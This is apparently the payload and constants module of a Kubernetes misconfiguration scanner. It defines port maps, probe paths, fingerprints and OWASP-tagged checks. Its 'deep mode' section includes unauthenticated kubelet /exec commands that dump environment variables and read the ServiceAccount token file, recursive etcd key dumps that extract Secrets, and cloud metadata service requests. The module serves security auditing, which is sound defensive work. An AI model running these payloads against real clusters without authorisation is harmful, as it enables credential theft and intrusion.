"""
Kubernetes scanner probe paths, fingerprints, port map, and attack payloads.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Default component → port mapping
# ---------------------------------------------------------------------------
K8S_COMPONENT_PORTS: dict[str, list[int]] = {
    "api_server": [6443, 443, 8080],       # 8080 = legacy insecure port
    "kubelet": [10250, 10255],              # 10255 = deprecated read-only
    "etcd": [2379, 2380],
    "scheduler": [10259],
    "controller_manager": [10257],
    "kube_proxy": [10249],
    "cadvisor": [4194],
    "dashboard": [8443, 30000, 31000, 32000],  # common NodePort ranges
}

# Default ports to scan when the user doesn't specify any
K8S_DEFAULT_SCAN_PORTS: list[int] = [
    6443, 443, 8080,           # apiserver
    10250, 10255,              # kubelet
    2379, 2380,                # etcd
    10259, 10257, 10249,       # scheduler / controller-manager / kube-proxy
    4194,                      # cAdvisor
    8443, 30000,               # dashboard
]

# ---------------------------------------------------------------------------
# API server probe paths
# ---------------------------------------------------------------------------
APISERVER_PROBE_PATHS: list[str] = [
    "/version",
    "/healthz",
    "/livez",
    "/readyz",
    "/api",
    "/apis",
    "/openapi/v2",
    "/metrics",
    "/logs",
]

# Paths that should be auth-protected — accessing them anon = misconfiguration
APISERVER_ANONYMOUS_RESOURCE_PATHS: list[str] = [
    "/api/v1/namespaces",
    "/api/v1/pods",
    "/api/v1/secrets",
    "/api/v1/configmaps",
    "/api/v1/serviceaccounts",
    "/api/v1/nodes",
]

# ---------------------------------------------------------------------------
# kubelet probe paths
# ---------------------------------------------------------------------------
KUBELET_PROBE_PATHS: list[str] = [
    "/healthz",
    "/pods",
    "/runningpods",
    "/stats/summary",
    "/spec/",
    "/metrics",
    "/metrics/cadvisor",
    "/logs/",
]

# ---------------------------------------------------------------------------
# etcd probe paths
# ---------------------------------------------------------------------------
ETCD_PROBE_PATHS: list[str] = [
    "/version",
    "/health",
    "/v2/keys/",
    "/v3/cluster/member/list",
]

# ---------------------------------------------------------------------------
# Scheduler / controller-manager probe paths
# ---------------------------------------------------------------------------
CONTROL_PLANE_PROBE_PATHS: list[str] = [
    "/healthz",
    "/metrics",
    "/configz",
]

# ---------------------------------------------------------------------------
# cAdvisor probe paths
# ---------------------------------------------------------------------------
CADVISOR_PROBE_PATHS: list[str] = [
    "/healthz",
    "/metrics",
    "/api/v1.3/containers/",
    "/api/v2.0/summary",
]

# ---------------------------------------------------------------------------
# Dashboard probe paths
# ---------------------------------------------------------------------------
DASHBOARD_PROBE_PATHS: list[str] = [
    "/",
    "/#/login",
    "/api/v1/csrftoken/login",
    "/api/v1/login",
    "/api/v1/namespaces",
]

# ---------------------------------------------------------------------------
# Fingerprint signatures
# ---------------------------------------------------------------------------
K8S_FINGERPRINTS: list[dict] = [
    # API server /version JSON
    {
        "source": "body",
        "key": "gitVersion",
        "description": "Kubernetes API server version JSON",
        "component": "api_server",
    },
    {
        "source": "body",
        "key": "major",
        "description": "Kubernetes API server version major field",
        "component": "api_server",
    },
    # API server header
    {
        "source": "header",
        "header": "audit-id",
        "description": "Kubernetes API server audit-id header",
        "component": "api_server",
    },
    # kubelet pods response
    {
        "source": "body",
        "key": "items",
        "description": "Kubernetes kubelet /pods JSON list",
        "component": "kubelet",
    },
    # etcd version
    {
        "source": "body",
        "key": "etcdcluster",
        "description": "etcd cluster version response",
        "component": "etcd",
    },
    {
        "source": "body",
        "key": "etcdserver",
        "description": "etcd server version field",
        "component": "etcd",
    },
    # cAdvisor
    {
        "source": "header",
        "header": "x-frame-options",
        "value": "DENY",
        "description": "cAdvisor default security headers",
        "component": "cadvisor",
    },
    # Dashboard
    {
        "source": "body",
        "key": "token",
        "description": "Kubernetes dashboard CSRF token",
        "component": "dashboard",
    },
]

# ---------------------------------------------------------------------------
# SelfSubjectAccessReview payload (K02 RBAC probe)
# ---------------------------------------------------------------------------
SELF_SUBJECT_ACCESS_REVIEW_PAYLOAD: dict = {
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
        "resourceAttributes": {
            "namespace": "",
            "verb": "list",
            "resource": "secrets",
        },
    },
}

SELF_SUBJECT_RULES_REVIEW_PAYLOAD: dict = {
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectRulesReview",
    "spec": {"namespace": "default"},
}

# ---------------------------------------------------------------------------
# Kubelet /exec attack payloads (deep mode)
# ---------------------------------------------------------------------------
# Format: {id, pod_path, command, detect, severity, description}
# pod_path is injected from discovered pod names at runtime
KUBELET_EXEC_PAYLOADS: list[dict] = [
    {
        "id": "K8S-ATK-EXEC-001",
        "command": "id",
        "detect_in_response": ["uid=", "root", "nobody"],
        "severity": "critical",
        "owasp_id": "K06",
        "description": "Unauthenticated kubelet /exec — command execution (id)",
    },
    {
        "id": "K8S-ATK-EXEC-002",
        "command": "env",
        "detect_in_response": ["PATH=", "HOME=", "KUBERNETES_"],
        "severity": "critical",
        "owasp_id": "K03",
        "description": "Unauthenticated kubelet /exec — environment variable dump (secrets leakage)",
    },
    {
        "id": "K8S-ATK-EXEC-003",
        "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "detect_in_response": ["eyJ"],     # base64-encoded JWT prefix
        "severity": "critical",
        "owasp_id": "K03",
        "description": "Unauthenticated kubelet /exec — ServiceAccount token extraction",
    },
]

# ---------------------------------------------------------------------------
# Anonymous API server read payloads (safe mode)
# ---------------------------------------------------------------------------
APISERVER_ANON_READ_PAYLOADS: list[dict] = [
    {
        "id": "K8S-ATK-ANON-001",
        "path": "/api/v1/secrets",
        "method": "GET",
        "detect_in_response": ["\"kind\":\"SecretList\"", "\"items\""],
        "severity": "critical",
        "owasp_id": "K03",
        "description": "Unauthenticated API server /api/v1/secrets access",
    },
    {
        "id": "K8S-ATK-ANON-002",
        "path": "/api/v1/pods",
        "method": "GET",
        "detect_in_response": ["\"kind\":\"PodList\"", "\"items\""],
        "severity": "high",
        "owasp_id": "K09",
        "description": "Unauthenticated API server /api/v1/pods access",
    },
    {
        "id": "K8S-ATK-ANON-003",
        "path": "/api/v1/namespaces",
        "method": "GET",
        "detect_in_response": ["\"kind\":\"NamespaceList\"", "\"items\""],
        "severity": "high",
        "owasp_id": "K09",
        "description": "Unauthenticated API server namespace enumeration",
    },
    {
        "id": "K8S-ATK-ANON-004",
        "path": "/api/v1/nodes",
        "method": "GET",
        "detect_in_response": ["\"kind\":\"NodeList\"", "\"items\""],
        "severity": "high",
        "owasp_id": "K09",
        "description": "Unauthenticated API server node enumeration",
    },
]

# ---------------------------------------------------------------------------
# etcd key dump payloads (deep mode)
# ---------------------------------------------------------------------------
ETCD_KEY_PAYLOADS: list[dict] = [
    {
        "id": "K8S-ATK-ETCD-001",
        "path": "/v2/keys/?recursive=true",
        "detect_in_response": ["\"node\"", "\"key\"", "registry/"],
        "severity": "critical",
        "owasp_id": "K03",
        "description": "Unauthenticated etcd v2 key enumeration (Secrets, RBAC, pods)",
    },
    {
        "id": "K8S-ATK-ETCD-002",
        "path": "/v2/keys/registry/secrets/?recursive=true",
        "detect_in_response": ["\"value\"", "token", "password", "data"],
        "severity": "critical",
        "owasp_id": "K03",
        "description": "Unauthenticated etcd v2 Kubernetes Secret extraction",
    },
]

# ---------------------------------------------------------------------------
# Cloud metadata SSRF payloads (K08, deep mode)
# ---------------------------------------------------------------------------
# These are checked via the kubelet /exec or direct HTTP from the scanner host
CLOUD_METADATA_URLS: list[dict] = [
    {
        "id": "K8S-ATK-META-001",
        "url": "http://169.254.169.254/latest/meta-data/",
        "detect_in_response": ["ami-id", "instance-id", "local-ipv4", "security-groups"],
        "severity": "high",
        "owasp_id": "K08",
        "description": "AWS EC2 instance metadata service (IMDSv1) reachable",
    },
    {
        "id": "K8S-ATK-META-002",
        "url": "http://169.254.169.254/computeMetadata/v1/",
        "detect_in_response": ["project", "instance", "serviceAccounts"],
        "detect_headers": {"Metadata-Flavor": "Google"},
        "severity": "high",
        "owasp_id": "K08",
        "description": "GCP instance metadata service reachable",
    },
    {
        "id": "K8S-ATK-META-003",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "detect_in_response": ["azEnvironment", "subscriptionId", "resourceGroupName"],
        "detect_headers": {"Metadata": "true"},
        "severity": "high",
        "owasp_id": "K08",
        "description": "Azure IMDS instance metadata reachable",
    },
]

# ---------------------------------------------------------------------------
# SelfSubjectAccessReview RBAC probe (K02, safe mode)
# ---------------------------------------------------------------------------
RBAC_PROBE_PAYLOADS: list[dict] = [
    {
        "id": "K8S-ATK-RBAC-001",
        "path": "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        "body": SELF_SUBJECT_ACCESS_REVIEW_PAYLOAD,
        "detect_in_response": ["\"allowed\":true"],
        "severity": "high",
        "owasp_id": "K02",
        "description": "Anonymous SelfSubjectAccessReview — anon user can list secrets",
    },
    {
        "id": "K8S-ATK-RBAC-002",
        "path": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
        "body": SELF_SUBJECT_RULES_REVIEW_PAYLOAD,
        "detect_in_response": ["\"resourceRules\"", "\"verb\""],
        "severity": "medium",
        "owasp_id": "K02",
        "description": "Anonymous SelfSubjectRulesReview — enumerates anon RBAC permissions",
    },
]
